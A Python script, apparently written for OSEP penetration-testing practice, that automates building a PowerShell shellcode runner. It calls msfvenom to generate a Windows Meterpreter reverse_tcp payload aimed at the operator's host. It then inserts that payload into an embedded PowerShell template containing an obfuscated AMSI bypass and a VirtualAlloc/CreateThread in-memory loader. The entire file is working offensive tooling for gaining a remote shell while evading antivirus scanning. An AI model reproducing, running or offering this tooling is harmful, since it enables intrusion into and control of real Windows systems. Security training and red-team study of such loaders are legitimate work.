# version 0.1 by Jan Splinter
# Based on https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Simple%20Shellcode%20Runner/Simple%20Shellcode%20Runner.ps1
# And if you must ask. Yes i am that efficient that i spend time to make something that will save me mere seconds every time i do something.
import os



input_file_name= 'unencodedPayload.txt' 
output_file_name = 'completedShellcodeRunner.txt'

# DO NOT EDIT BELOW HERE



current_directory = os.getcwd()
input_file_path= os.path.join(current_directory, input_file_name) # Specify the input file path
output_file_path = os.path.join(current_directory, output_file_name)  # Specify the output file path

generatepayload= "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell -o {0} > /dev/null 2>&1".format(input_file_name) 




# Execute the command to generate the payload
#result = subprocess.run([generatepayload], capture_output=True, text=True)
result = os.system(generatepayload) 

# Read the content of unencodedPayload.txt

with open(input_file_path, 'r') as file:
    payload_content = file.read()
    print("New file: {0}".format(input_file_path))


# Source:  https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Simple%20Shellcode%20Runner/Simple%20Shellcode%20Runner.ps1
shellcoderunner = '''
# Compact AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

# Shellcode loader >:]
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Copy shellcode to allocated memory
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f powershell

####PAYLOADHERE####

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF) 
'''

modified_shellcoderunner = shellcoderunner.replace("####PAYLOADHERE####", payload_content)
print("")

# write the new shellocode to a file.
with open(output_file_path, 'w') as output_file:
    output_file.write(modified_shellcoderunner)
    print("New file: {0}".format(output_file_path))
